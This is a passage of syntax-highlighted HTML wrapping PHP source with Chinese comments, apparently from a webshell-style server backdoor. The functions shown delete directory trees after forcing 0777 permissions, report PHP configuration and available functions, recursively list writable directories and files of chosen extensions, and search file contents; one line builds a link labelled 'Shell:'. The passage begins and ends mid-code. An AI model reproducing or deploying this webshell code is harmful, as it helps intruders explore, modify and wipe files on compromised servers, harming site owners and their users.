style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&amp;#13&amp;#10Shell: '</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'shell'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffcc66; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #66cccc; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">].</span><span style="color: #66cccc; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #66cccc;">''</span>;
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#21024;&#38500;&#30446;&#24405;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">deltree</span>($<span style="color: #ffcc66;">deldir</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mydir</span>=<span style="color: #99cc99;">@dir</span>($<span style="color: #ffcc66;">deldir</span>);<span style="color: #f2777a; background-color: #515151;">   </span>
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span>($<span style="color: #ffcc66;">file</span>=$<span style="color: #ffcc66;">mydir</span>-&gt;<span style="color: #cccccc; background-color: #2d2d2d;">read</span>())     {<span style="color: #f2777a; background-color: #515151;">       </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>((<span style="color: #cccccc; background-color: #2d2d2d;">is_dir(</span>$<span style="color: #ffcc66;">deldir</span>.<span style="color: #66cccc;">'/'</span>.$<span style="color: #ffcc66;">file</span>)) &amp;&amp; ($<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'.'</span>) &amp;&amp; ($<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'..'</span>)) {<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">chmod(</span>$<span style="color: #ffcc66;">deldir</span>.<span style="color: #66cccc;">'/'</span>.$<span style="color: #ffcc66;">file</span>,<span style="color: #cccccc; background-color: #2d2d2d;">0777</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">deltree(</span>$<span style="color: #ffcc66;">deldir</span>.<span style="color: #66cccc;">'/'</span>.$<span style="color: #ffcc66;">file</span>);<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">is_file(</span>$<span style="color: #ffcc66;">deldir</span>.<span style="color: #66cccc;">'/'</span>.$<span style="color: #ffcc66;">file</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">chmod(</span>$<span style="color: #ffcc66;">deldir</span>.<span style="color: #66cccc;">'/'</span>.$<span style="color: #ffcc66;">file</span>,<span style="color: #cccccc; background-color: #2d2d2d;">0777</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">unlink(</span>$<span style="color: #ffcc66;">deldir</span>.<span style="color: #66cccc;">'/'</span>.$<span style="color: #ffcc66;">file</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   }<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">mydir</span>-&gt;<span style="color: #cccccc; background-color: #2d2d2d;">close</span>();<span style="color: #f2777a; background-color: #515151;"> </span>
<span style="background-color: #515151;"> </span>   @<span style="color: #cccccc; background-color: #2d2d2d;">chmod(</span>$<span style="color: #ffcc66;">deldir</span>,<span style="color: #cccccc; background-color: #2d2d2d;">0777</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> @<span style="color: #cccccc; background-color: #2d2d2d;">rmdir(</span>$<span style="color: #ffcc66;">deldir</span>) ? <span style="color: #cccccc; background-color: #2d2d2d;">1</span> : <span style="color: #cccccc; background-color: #2d2d2d;">0</span>;
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#34920;&#26684;&#34892;&#38388;&#30340;&#32972;&#26223;&#33394;&#26367;&#25442;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">bg</span>() {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">bgc</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> ($<span style="color: #ffcc66;">bgc</span>++%<span style="color: #cccccc; background-color: #2d2d2d;">2</span>==<span style="color: #cccccc; background-color: #2d2d2d;">0</span>) ? <span style="color: #66cccc;">'alt1'</span> : <span style="color: #66cccc;">'alt2'</span>;
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30340;&#25991;&#20214;&#31995;&#32479;&#36335;&#24452;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">getPath</span>($<span style="color: #ffcc66;">scriptpath</span>, $<span style="color: #ffcc66;">nowpath</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">nowpath</span> == <span style="color: #66cccc;">'.'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">nowpath</span> = $<span style="color: #ffcc66;">scriptpath</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">nowpath</span> = <span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #66cccc;">'\\'</span>, <span style="color: #66cccc;">'/'</span>, $<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">nowpath</span> = <span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #66cccc;">'//'</span>, <span style="color: #66cccc;">'/'</span>, $<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">substr(</span>$<span style="color: #ffcc66;">nowpath</span>, -<span style="color: #cccccc; background-color: #2d2d2d;">1</span>) != <span style="color: #66cccc;">'/'</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">nowpath</span> = $<span style="color: #ffcc66;">nowpath</span>.<span style="color: #66cccc;">'/'</span>;
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">nowpath</span>;
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#33719;&#21462;&#24403;&#21069;&#30446;&#24405;&#30340;&#19978;&#32423;&#30446;&#24405;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">getUpPath</span>($<span style="color: #ffcc66;">nowpath</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">pathdb</span> = <span style="color: #cccccc; background-color: #2d2d2d;">explode(</span><span style="color: #66cccc;">'/'</span>, $<span style="color: #ffcc66;">nowpath</span>);
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">num</span> = <span style="color: #cccccc; background-color: #2d2d2d;">count(</span>$<span style="color: #ffcc66;">pathdb</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">num</span> &gt; <span style="color: #cccccc; background-color: #2d2d2d;">2</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">unset(</span>$<span style="color: #ffcc66;">pathdb</span>[$<span style="color: #ffcc66;">num</span>-<span style="color: #cccccc; background-color: #2d2d2d;">1</span>],$<span style="color: #ffcc66;">pathdb</span>[$<span style="color: #ffcc66;">num</span>-<span style="color: #cccccc; background-color: #2d2d2d;">2</span>]);
<span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">uppath</span> = <span style="color: #cccccc; background-color: #2d2d2d;">implode(</span><span style="color: #66cccc;">'/'</span>, $<span style="color: #ffcc66;">pathdb</span>).<span style="color: #66cccc;">'/'</span>;
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">uppath</span> = <span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #66cccc;">'//'</span>, <span style="color: #66cccc;">'/'</span>, $<span style="color: #ffcc66;">uppath</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">uppath</span>;
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#26816;&#26597;PHP&#37197;&#32622;&#21442;&#25968;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">getcfg</span>($<span style="color: #ffcc66;">varname</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">result</span> = <span style="color: #cccccc; background-color: #2d2d2d;">get_cfg_var(</span>$<span style="color: #ffcc66;">varname</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">result</span> == <span style="color: #cccccc; background-color: #2d2d2d;">0</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #66cccc;">'No'</span>;
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span> ($<span style="color: #ffcc66;">result</span> == <span style="color: #cccccc; background-color: #2d2d2d;">1</span>) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #66cccc;">'Yes'</span>;
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">result</span>;
<span style="background-color: #515151;"> </span>   }
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#26816;&#26597;&#20989;&#25968;&#24773;&#20917;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">getfun</span>($<span style="color: #ffcc66;">funName</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> (<span style="color: #6699cc;">false</span> !== <span style="color: #cccccc; background-color: #2d2d2d;">function_exists(</span>$<span style="color: #ffcc66;">funName</span>)) ? <span style="color: #66cccc;">'Yes'</span> : <span style="color: #66cccc;">'No'</span>;
}

<span style="color: #999999; font-style: italic;">// </span><span style="color: #999999; font-style: italic;">&#33719;&#24471;&#25991;&#20214;&#25193;&#23637;&#21517;</span>
<span style="color: #99cc99;">function</span> <span style="color: #f99157;">getext</span>($<span style="color: #ffcc66;">file</span>) {
<span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">info</span> = <span style="color: #cccccc; background-color: #2d2d2d;">pathinfo(</span>$<span style="color: #ffcc66;">file</span>);
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">info</span>[<span style="color: #66cccc;">'extension'</span>];
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">GetWDirList</span>($<span style="color: #ffcc66;">dir</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">dirdata</span>,$<span style="color: #ffcc66;">j</span>,$<span style="color: #ffcc66;">nowpath</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">j</span> &amp;&amp; $<span style="color: #ffcc66;">j</span>=<span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">dh</span> = <span style="color: #cccccc; background-color: #2d2d2d;">opendir(</span>$<span style="color: #ffcc66;">dir</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span> ($<span style="color: #ffcc66;">file</span> = <span style="color: #cccccc; background-color: #2d2d2d;">readdir(</span>$<span style="color: #ffcc66;">dh</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">f</span>=<span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #66cccc;">'//'</span>,<span style="color: #66cccc;">'/'</span>,$<span style="color: #ffcc66;">dir</span>.<span style="color: #66cccc;">'/'</span>.$<span style="color: #ffcc66;">file</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'.'</span> &amp;&amp; $<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'..'</span> &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">is_dir(</span>$<span style="color: #ffcc66;">f</span>)){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">is_writable(</span>$<span style="color: #ffcc66;">f</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'filename'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span>$<span style="color: #ffcc66;">nowpath</span>,<span style="color: #66cccc;">''</span>,$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'mtime'</span>]=<span style="color: #99cc99;">@date</span>(<span style="color: #66cccc;">'Y-m-d H:i:s'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">filemtime(</span>$<span style="color: #ffcc66;">f</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'dirchmod'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getChmod(</span>$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'dirperm'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getPerms(</span>$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'dirlink'</span>]=$<span style="color: #ffcc66;">dir</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">dirdata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'server_link'</span>]=$<span style="color: #ffcc66;">f</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">j</span>++;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">GetWDirList(</span>$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">closedir(</span>$<span style="color: #ffcc66;">dh</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">clearstatcache(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">dirdata</span>;
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   }
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">GetWFileList</span>($<span style="color: #ffcc66;">dir</span>){
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">filedata</span>,$<span style="color: #ffcc66;">j</span>,$<span style="color: #ffcc66;">nowpath</span>, $<span style="color: #ffcc66;">writabledb</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">j</span> &amp;&amp; $<span style="color: #ffcc66;">j</span>=<span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">dh</span> = <span style="color: #cccccc; background-color: #2d2d2d;">opendir(</span>$<span style="color: #ffcc66;">dir</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span> ($<span style="color: #ffcc66;">file</span> = <span style="color: #cccccc; background-color: #2d2d2d;">readdir(</span>$<span style="color: #ffcc66;">dh</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">ext</span> = <span style="color: #cccccc; background-color: #2d2d2d;">getext(</span>$<span style="color: #ffcc66;">file</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">f</span>=<span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #66cccc;">'//'</span>,<span style="color: #66cccc;">'/'</span>,$<span style="color: #ffcc66;">dir</span>.<span style="color: #66cccc;">'/'</span>.$<span style="color: #ffcc66;">file</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'.'</span> &amp;&amp; $<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'..'</span> &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">is_dir(</span>$<span style="color: #ffcc66;">f</span>)){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">GetWFileList(</span>$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">elseif</span>($<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'.'</span> &amp;&amp; $<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'..'</span> &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">is_file(</span>$<span style="color: #ffcc66;">f</span>) &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">in_array(</span>$<span style="color: #ffcc66;">ext</span>, <span style="color: #cccccc; background-color: #2d2d2d; text-decoration: underline;">explode(</span><span style="color: #66cccc; text-decoration: underline;">','</span><span style="text-decoration: underline;">, $</span><span style="color: #ffcc66; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">))){</span>
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> (<span style="color: #cccccc; background-color: #2d2d2d;">is_writable(</span>$<span style="color: #ffcc66;">f</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'filename'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span>$<span style="color: #ffcc66;">nowpath</span>,<span style="color: #66cccc;">''</span>,$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'size'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">sizecount(</span>@<span style="color: #cccccc; background-color: #2d2d2d;">filesize(</span>$<span style="color: #ffcc66;">f</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'mtime'</span>]=<span style="color: #99cc99;">@date</span>(<span style="color: #66cccc;">'Y-m-d H:i:s'</span>,<span style="color: #cccccc; background-color: #2d2d2d;">filemtime(</span>$<span style="color: #ffcc66;">f</span>));
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'filechmod'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getChmod(</span>$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'fileperm'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getPerms(</span>$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'fileowner'</span>]=<span style="color: #cccccc; background-color: #2d2d2d;">getUser(</span>$<span style="color: #ffcc66;">f</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'dirlink'</span>]=$<span style="color: #ffcc66;">dir</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">filedata</span>[$<span style="color: #ffcc66;">j</span>][<span style="color: #66cccc;">'server_link'</span>]=$<span style="color: #ffcc66;">f</span>;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">j</span>++;
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   }
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">closedir(</span>$<span style="color: #ffcc66;">dh</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">clearstatcache(</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> $<span style="color: #ffcc66;">filedata</span>;
<span style="background-color: #515151;"> </span>   } <span style="color: #99cc99;">else</span> {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">return</span> <span style="color: #cccccc; background-color: #2d2d2d;">array(</span>);
<span style="background-color: #515151;"> </span>   }
}

<span style="color: #99cc99;">function</span> <span style="color: #f99157;">GetSFileList</span>($<span style="color: #ffcc66;">dir</span>, $<span style="color: #ffcc66;">content</span>, $<span style="color: #ffcc66;">re</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>) {
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">global</span> $<span style="color: #ffcc66;">filedata</span>,$<span style="color: #ffcc66;">j</span>,$<span style="color: #ffcc66;">nowpath</span>, $<span style="color: #ffcc66;">writabledb</span>;
<span style="background-color: #515151;"> </span>   !$<span style="color: #ffcc66;">j</span> &amp;&amp; $<span style="color: #ffcc66;">j</span>=<span style="color: #cccccc; background-color: #2d2d2d;">1</span>;
<span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span> ($<span style="color: #ffcc66;">dh</span> = <span style="color: #cccccc; background-color: #2d2d2d;">opendir(</span>$<span style="color: #ffcc66;">dir</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">while</span> ($<span style="color: #ffcc66;">file</span> = <span style="color: #cccccc; background-color: #2d2d2d;">readdir(</span>$<span style="color: #ffcc66;">dh</span>)) {
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">ext</span> = <span style="color: #cccccc; background-color: #2d2d2d;">getext(</span>$<span style="color: #ffcc66;">file</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   $<span style="color: #ffcc66;">f</span>=<span style="color: #cccccc; background-color: #2d2d2d;">str_replace(</span><span style="color: #66cccc;">'//'</span>,<span style="color: #66cccc;">'/'</span>,$<span style="color: #ffcc66;">dir</span>.<span style="color: #66cccc;">'/'</span>.$<span style="color: #ffcc66;">file</span>);
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #99cc99;">if</span>($<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'.'</span> &amp;&amp; $<span style="color: #ffcc66;">file</span>!=<span style="color: #66cccc;">'..'</span> &amp;&amp; <span style="color: #cccccc; background-color: #2d2d2d;">is_dir(</span>$<span style="color: #ffcc66;">f</span>)){
<span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="background-color: #515151;"> </span>   <span style="color: #cccccc; background-color: #2d2d2d;">GetSFileList(</span>$<span style="color: #ffcc66;">f</span>, $<span style="color: #ffcc66;">content</span>, $<span style="color: #ffcc66;">re</span> = <span style="color: #cccccc; background-color: #2d2d2d;">0</span>);
